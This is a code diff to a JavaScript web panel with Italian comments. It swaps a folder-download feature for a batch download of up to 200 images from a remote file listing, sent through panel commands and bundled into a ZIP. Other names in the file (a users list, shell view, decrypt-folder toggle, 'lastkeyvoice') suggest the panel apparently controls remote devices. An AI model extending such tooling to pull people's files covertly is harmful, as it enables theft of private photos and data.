@@ -21,14 +21,14 @@ var lastkeyvoice = "";
 var wallpaperno = "";
 var uo2 = document.getElementById("users");
 
-// Variabili per il download delle cartelle
-var folderDownloadQueue = [];
-var folderDownloadIndex = 0;
-var folderDownloadName = "";
-var folderDownloadBasePath = "";
-var folderFilesContent = [];
-var isFolderDownloadActive = false;
-var downloadTimeout = null;
+// Variabili per il download batch di immagini
+var imageDownloadQueue = [];
+var imageDownloadIndex = 0;
+var imageDownloadDir = "";
+var imageDownloadBatchSize = 200;
+var imageDownloadActive = false;
+var imageDownloadTimeout = null;
+var imageDownloadContent = [];
 
 function opnav(o) {
     if ($("#navbar").css("display") == "none") {
@@ -162,6 +162,9 @@ function filesfol(respo, v1, v2, v3, var32) {
             galleryPanel.style.padding = "10px";
             galleryPanel.style.borderRadius = "5px";
             galleryPanel.style.textAlign = "center";
+            
+            // Aggiorna i controlli della galleria
+            setTimeout(updateGalleryControls, 100);
         }
     }
 
@@ -182,6 +185,242 @@ function filesfol(respo, v1, v2, v3, var32) {
     } else {
         uo.innerHTML = "" + respo;
     }
+}
+
+// Funzione per aggiornare i controlli della galleria
+function updateGalleryControls() {
+    var galleryPanel = document.getElementById("gallery-controls");
+    if (!galleryPanel) return;
+    
+    // Verifica se il pulsante esiste già
+    var existingBtn = document.getElementById("download-images-btn");
+    if (existingBtn) {
+        existingBtn.remove();
+    }
+    
+    // Crea il nuovo pulsante
+    var downloadBtn = document.createElement("button");
+    downloadBtn.id = "download-images-btn";
+    downloadBtn.textContent = "Scarica 200 immagini";
+    downloadBtn.onclick = startImageBatchDownload;
+    downloadBtn.style.marginLeft = "10px";
+    downloadBtn.style.background = "#4CAF50";
+    downloadBtn.style.color = "white";
+    downloadBtn.style.border = "none";
+    downloadBtn.style.padding = "8px 15px";
+    downloadBtn.style.borderRadius = "5px";
+    downloadBtn.style.cursor = "pointer";
+    
+    galleryPanel.appendChild(downloadBtn);
+}
+
+// Funzione per avviare il download batch di immagini
+function startImageBatchDownload() {
+    if (imageDownloadActive) return;
+    
+    var respDiv = document.getElementById("resp");
+    var fileItems = respDiv.querySelectorAll("li.im, li.vi");
+    var imageExtensions = /\.(jpg|jpeg|png|gif|bmp|webp)$/i;
+    
+    imageDownloadQueue = [];
+    imageDownloadIndex = 0;
+    imageDownloadDir = var32;
+    imageDownloadContent = [];
+    
+    // Raccogli le immagini dalla cartella corrente
+    for (var i = 0; i < fileItems.length; i++) {
+        var fileName = "";
+        var child = fileItems[i].firstChild;
+        while (child) {
+            if (child.nodeType === 3) fileName += child.nodeValue;
+            else if (child.tagName === "B") break;
+            child = child.nextSibling;
+        }
+        fileName = fileName.trim();
+        
+        if (imageExtensions.test(fileName) && fileName.indexOf(".") !== 0) {
+            imageDownloadQueue.push(fileName);
+        }
+    }
+    
+    if (imageDownloadQueue.length === 0) {
+        alert("Nessuna immagine trovata in questa cartella.");
+        return;
+    }
+    
+    // Limita a 200 immagini per batch
+    if (imageDownloadQueue.length > imageDownloadBatchSize) {
+        imageDownloadQueue = imageDownloadQueue.slice(0, imageDownloadBatchSize);
+    }
+    
+    imageDownloadActive = true;
+    imageDownloadIndex = 0;
+    
+    // Disabilita il pulsante
+    var btn = document.getElementById("download-images-btn");
+    if (btn) {
+        btn.disabled = true;
+        btn.textContent = "Download in corso...";
+    }
+    
+    // Mostra il loader
+    $("#preloaderr").fadeIn();
+    document.getElementById("loadtxt").innerText = "Download immagini: 0/" + imageDownloadQueue.length;
+    
+    // Inizia il download
+    downloadNextImage();
+}
+
+// Funzione per scaricare la prossima immagine
+function downloadNextImage() {
+    if (!imageDownloadActive) return;
+    
+    if (imageDownloadIndex >= imageDownloadQueue.length) {
+        // Tutte le immagini scaricate, crea lo ZIP
+        createImageZip();
+        return;
+    }
+    
+    var fileName = imageDownloadQueue[imageDownloadIndex];
+    var fullPath = imageDownloadDir + "/" + fileName;
+    
+    document.getElementById("loadtxt").innerText = "Download immagini: " + (imageDownloadIndex + 1) + "/" + imageDownloadQueue.length + " - " + fileName;
+    
+    // Imposta timeout di sicurezza
+    if (imageDownloadTimeout) {
+        clearTimeout(imageDownloadTimeout);
+    }
+    
+    imageDownloadTimeout = setTimeout(function() {
+        console.warn("Timeout per: " + fileName);
+        imageDownloadIndex++;
+        downloadNextImage();
+    }, 15000); // 15 secondi
+    
+    // Salva il nome del file corrente per il download
+    window._currentDownloadImage = fileName;
+    
+    // Invia il comando per scaricare l'immagine
+    manager = "imagedownload";
+    setdatcmd("cd", fullPath, "", respov);
+}
+
+// Funzione per gestire il download delle immagini
+function handleImageDownload(respo, v1, v2, v3) {
+    if (!imageDownloadActive) return;
+    
+    // Cancella il timeout
+    if (imageDownloadTimeout) {
+        clearTimeout(imageDownloadTimeout);
+        imageDownloadTimeout = null;
+    }
+    
+    var fileName = window._currentDownloadImage;
+    
+    try {
+        if (respo == "imgview" && v1) {
+            imageDownloadContent.push({
+                name: fileName,
+                content: v1,
+                type: "image"
+            });
+        } else if (respo == "fileview" && v1) {
+            imageDownloadContent.push({
+                name: fileName,
+                content: v1,
+                type: "file"
+            });
+        }
+    } catch (e) {
+        console.warn("Errore nel download di: " + fileName, e);
+    }
+    
+    // Passa alla prossima immagine
+    imageDownloadIndex++;
+    
+    // Piccolo ritardo per evitare di sovraccaricare il browser
+    setTimeout(function() {
+        $("#preloaderr").fadeIn();
+        downloadNextImage();
+    }, 300);
+}
+
+// Funzione per creare lo ZIP delle immagini
+async function createImageZip() {
+    try {
+        document.getElementById("loadtxt").innerText = "Creazione ZIP immagini...";
+        
+        if (imageDownloadContent.length === 0) {
+            alert("Nessuna immagine scaricata");
+            imageDownloadActive = false;
+            var btn = document.getElementById("download-images-btn");
+            if (btn) {
+                btn.disabled = false;
+                btn.textContent = "Scarica " + imageDownloadBatchSize + " immagini";
+            }
+            $("#preloaderr").fadeOut();
+            return;
+        }
+        
+        var zip = new JSZip();
+        
+        for (var i = 0; i < imageDownloadContent.length; i++) {
+            var img = imageDownloadContent[i];
+            
+            try {
+                if (img.type === "image") {
+                    // Converti base64 in blob
+                    var binaryData = atob(img.content);
+                    var array = new Uint8Array(binaryData.length);
+                    for (var j = 0; j < binaryData.length; j++) {
+                        array[j] = binaryData.charCodeAt(j);
+                    }
+                    zip.file(img.name, array);
+                } else {
+                    // File generico
+                    zip.file(img.name, img.content);
+                }
+            } catch (e) {
+                console.warn("Errore nell'aggiunta di: " + img.name, e);
+            }
+            
+            if (i % 20 === 0) {
+                document.getElementById("loadtxt").innerText = "Aggiunta immagini: " + (i + 1) + "/" + imageDownloadContent.length;
+                await new Promise(resolve => setTimeout(resolve, 50));
+            }
+        }
+        
+        document.getElementById("loadtxt").innerText = "Generazione ZIP...";
+        var content = await zip.generateAsync({
+            type: "blob",
+            compression: "DEFLATE",
+            compressionOptions: { level: 6 }
+        });
+        
+        // Scarica lo ZIP
+        var url = URL.createObjectURL(content);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = "immagini_" + new Date().getTime() + ".zip";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        
+        alert("Download completato! " + imageDownloadContent.length + " immagini scaricate come ZIP.");
+    } catch (e) {
+        console.error("Errore nella creazione dello ZIP:", e);
+        alert("Errore nel download delle immagini: " + e.message);
+    }
+    
+    imageDownloadActive = false;
+    imageDownloadContent = [];
+    var btn = document.getElementById("download-images-btn");
+    if (btn) {
+        btn.disabled = false;
+        btn.textContent = "Scarica " + imageDownloadBatchSize + " immagini";
+    }
+    $("#preloaderr").fadeOut();
 }
 
 function hidekarbsdk() {
@@ -275,7 +514,7 @@ function showdat(o) {
             var v2 = dat.v2 + "";
             var v3 = dat.v3 + "";
 
-            if (manager != "thumbnailfetch" && manager != "folderscan" && manager != "folderdownload") {
+            if (manager != "thumbnailfetch" && manager != "imagedownload") {
                 var32 = dat.var2 + "";
             }
 
@@ -283,10 +522,8 @@ function showdat(o) {
 
             if (manager == "filesmanager") {
                 filesfol(respo, v1, v2, v3, var32);
-            } else if (manager == "folderscan") {
-                handleFolderScan(respo, v1, v2, v3, var32);
-            } else if (manager == "folderdownload") {
-                handleFolderDownload(respo, v1, v2, v3);
+            } else if (manager == "imagedownload") {
+                handleImageDownload(respo, v1, v2, v3);
             } else if (manager == "fileview") {
                 fileev(v1);
             } else if (manager == "shellview") {
@@ -366,293 +603,6 @@ function showdat(o) {
             console.log("No data available");
         }
     });
-}
-
-// Funzione per scaricare una cartella
-function downloadfol(o) {
-    document.getElementById("filwt").style.display = "none";
-    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
-    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
-
-    if (tarfol == "..") {
-        return;
-    }
-
-    var folderPath = "";
-
-    if ((tarfoltype.indexOf("fo") > -1) && (tarfol.indexOf("<b>") > -1)) {
-        folderPath = var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>"));
-        folderDownloadName = tarfol.substr(0, tarfol.indexOf("<b>"));
-    } else if (tarfoltype.indexOf("fo") > -1) {
-        folderPath = var32 + "/" + tarfol;
-        folderDownloadName = tarfol;
-    } else {
-        // È un file, scarica direttamente
-        setdatcmd("cd", var32 + "/" + tarfol, "", respov);
-        manager = "fileview";
-        return;
-    }
-
-    // Reset delle variabili
-    folderDownloadQueue = [];
-    folderDownloadIndex = 0;
-    folderFilesContent = [];
-    folderDownloadBasePath = folderPath;
-    isFolderDownloadActive = true;
-    
-    if (downloadTimeout) {
-        clearTimeout(downloadTimeout);
-        downloadTimeout = null;
-    }
-
-    // Mostra il loader
-    $("#preloaderr").fadeIn();
-    document.getElementById("loadtxt").innerText = "Scansione cartella: " + folderDownloadName + "...";
-
-    // Inizia la scansione
-    manager = "folderscan";
-    setdatcmd("cd", folderPath, "", respov);
-}
-
-// Gestisce la scansione delle cartelle
-function handleFolderScan(respo, v1, v2, v3, currentPath) {
-    if (!isFolderDownloadActive) return;
-
-    try {
-        var tempDiv = document.createElement("div");
-        tempDiv.innerHTML = respo;
-
-        var fileItems = tempDiv.querySelectorAll("li");
-        var files = [];
-
-        for (var i = 0; i < fileItems.length; i++) {
-            var item = fileItems[i];
-            var className = item.className || "";
-            var itemText = item.textContent || item.innerText;
-
-            // Estrai il nome del file/cartella
-            var nameMatch = itemText.match(/^([^<]+)/);
-            if (nameMatch && nameMatch[1].trim() !== "") {
-                var name = nameMatch[1].trim();
-                
-                // Ignora i file che iniziano con "." e le cartelle
-                if (name.indexOf(".") === 0) {
-                    continue; // Salta i file nascosti
-                }
-
-                // Ignora le cartelle (class="fo")
-                if (className.indexOf("fo") > -1) {
-                    continue; // Salta le sottocartelle
-                }
-
-                // Accetta solo file (class="im", "vi", "fi", ecc.)
-                if (className.indexOf("im") > -1 || className.indexOf("vi") > -1 || className.indexOf("fi") > -1) {
-                    files.push({
-                        name: name,
-                        path: currentPath + "/" + name
-                    });
-                }
-            }
-        }
-
-        // Aggiungi i file alla coda di download
-        for (var i = 0; i < files.length; i++) {
-            folderDownloadQueue.push(files[i]);
-        }
-
-        // Passa direttamente al download
-        startFolderDownload();
-        
-    } catch (e) {
-        console.error("Errore nella scansione:", e);
-        cancelFolderDownload();
-    }
-}
-
-// Inizia il download dei file
-function startFolderDownload() {
-    if (!isFolderDownloadActive) return;
-    
-    if (folderDownloadQueue.length === 0) {
-        alert("Nessun file trovato nella cartella " + folderDownloadName);
-        cancelFolderDownload();
-        return;
-    }
-
-    folderDownloadIndex = 0;
-    manager = "folderdownload";
-    downloadNextFolderFile();
-}
-
-// Scarica il prossimo file
-function downloadNextFolderFile() {
-    if (!isFolderDownloadActive) return;
-    
-    if (folderDownloadIndex >= folderDownloadQueue.length) {
-        createFolderZip();
-        return;
-    }
-
-    var file = folderDownloadQueue[folderDownloadIndex];
-    document.getElementById("loadtxt").innerText = "Download: " + (folderDownloadIndex + 1) + "/" + folderDownloadQueue.length + " - " + file.name;
-
-    // Imposta un timeout di sicurezza
-    if (downloadTimeout) {
-        clearTimeout(downloadTimeout);
-    }
-    
-    downloadTimeout = setTimeout(function() {
-        console.warn("Timeout per: " + file.name);
-        // Salta il file e continua
-        folderDownloadIndex++;
-        downloadNextFolderFile();
-    }, 15000); // 15 secondi di timeout
-
-    setdatcmd("cd", file.path, "", respov);
-}
-
-// Gestisce il download dei file
-function handleFolderDownload(respo, v1, v2, v3) {
-    if (!isFolderDownloadActive) return;
-
-    // Cancella il timeout
-    if (downloadTimeout) {
-        clearTimeout(downloadTimeout);
-        downloadTimeout = null;
-    }
-
-    var currentFile = folderDownloadQueue[folderDownloadIndex];
-
-    try {
-        if (respo == "imgview" && v1) {
-            folderFilesContent.push({
-                name: currentFile.name,
-                path: currentFile.path,
-                type: "image",
-                content: v1,
-                isBase64: true
-            });
-        } else if (respo == "fileview" && v1) {
-            folderFilesContent.push({
-                name: currentFile.name,
-                path: currentFile.path,
-                type: "text",
-                content: v1,
-                isBase64: false
-            });
-        } else {
-            console.warn("File non scaricabile: " + currentFile.name);
-        }
-    } catch (e) {
-        console.warn("Errore nel download del file: " + currentFile.name, e);
-    }
-
-    folderDownloadIndex++;
-    
-    // Aggiorna il progresso ogni 5 file
-    if (folderDownloadIndex % 5 === 0) {
-        document.getElementById("loadtxt").innerText = "Download: " + folderDownloadIndex + "/" + folderDownloadQueue.length;
-    }
-    
-    // Continua con il prossimo file
-    $("#preloaderr").fadeIn();
-    downloadNextFolderFile();
-}
-
-// Crea il file ZIP
-async function createFolderZip() {
-    if (!isFolderDownloadActive) return;
-    
-    try {
-        // Mostra il loader
-        $("#preloaderr").fadeIn();
-        document.getElementById("loadtxt").innerText = "Creazione file ZIP...";
-        
-        if (folderFilesContent.length === 0) {
-            alert("Nessun file scaricabile trovato");
-            cancelFolderDownload();
-            return;
-        }
-        
-        // Crea un nuovo ZIP
-        var zip = new JSZip();
-        
-        // Aggiungi ogni file allo ZIP
-        var addedFiles = 0;
-        
-        for (var i = 0; i < folderFilesContent.length; i++) {
-            var file = folderFilesContent[i];
-            var relativePath = file.path.replace(folderDownloadBasePath + '/', '');
-            
-            try {
-                if (file.type === 'image' && file.isBase64) {
-                    // Converti base64 in blob
-                    var binaryData = atob(file.content);
-                    var array = new Uint8Array(binaryData.length);
-                    for (var j = 0; j < binaryData.length; j++) {
-                        array[j] = binaryData.charCodeAt(j);
-                    }
-                    zip.file(relativePath, array);
-                } else {
-                    // File di testo
-                    zip.file(relativePath, file.content);
-                }
-                addedFiles++;
-            } catch (e) {
-                console.warn("Errore nell'aggiunta del file: " + file.name, e);
-            }
-            
-            // Aggiorna il progresso
-            if (i % 20 === 0) {
-                document.getElementById("loadtxt").innerText = "Aggiunta file allo ZIP: " + (i + 1) + "/" + folderFilesContent.length;
-                await new Promise(resolve => setTimeout(resolve, 50));
-            }
-        }
-        
-        // Genera lo ZIP
-        document.getElementById("loadtxt").innerText = "Generazione ZIP...";
-        var content = await zip.generateAsync({
-            type: "blob",
-            compression: "DEFLATE",
-            compressionOptions: {
-                level: 6
-            }
-        });
-        
-        // Scarica lo ZIP
-        var url = URL.createObjectURL(content);
-        var a = document.createElement('a');
-        a.href = url;
-        a.download = folderDownloadName + '.zip';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        
-        alert("Download completato! " + addedFiles + " file scaricati come " + folderDownloadName + '.zip');
-    } catch (e) {
-        console.error("Errore nella creazione dello ZIP:", e);
-        alert("Errore nel download della cartella: " + e.message);
-    }
-    
-    cancelFolderDownload();
-}
-
-// Funzione per cancellare il download
-function cancelFolderDownload() {
-    isFolderDownloadActive = false;
-    folderDownloadQueue = [];
-    folderDownloadIndex = 0;
-    folderFilesContent = [];
-    
-    if (downloadTimeout) {
-        clearTimeout(downloadTimeout);
-        downloadTimeout = null;
-    }
-    
-    $("#preloaderr").fadeOut();
-    manager = "filesmanager";
-    setdatcmd("cd", var32, "", respov);
 }
 
 function backk(o) {
@@ -1329,17 +1279,6 @@ function opfol(event) {
         document.getElementById("decrfol").style.display = "block";
     } else {
         document.getElementById("decrfol").style.display = "none";
-    }
-
-    // Mostra/nascondi il pulsante download in base al tipo
-    var downloadBtn = document.getElementById("downfol");
-    if (downloadBtn) {
-        var tarfoltype = event.target.getAttribute("class");
-        if (tarfol == ".." || !tarfoltype || tarfoltype.indexOf("fo") < 0) {
-            downloadBtn.style.display = "none";
-        } else {
-            downloadBtn.style.display = "block";
-        }
     }
 
     if (tarfol == "..") {
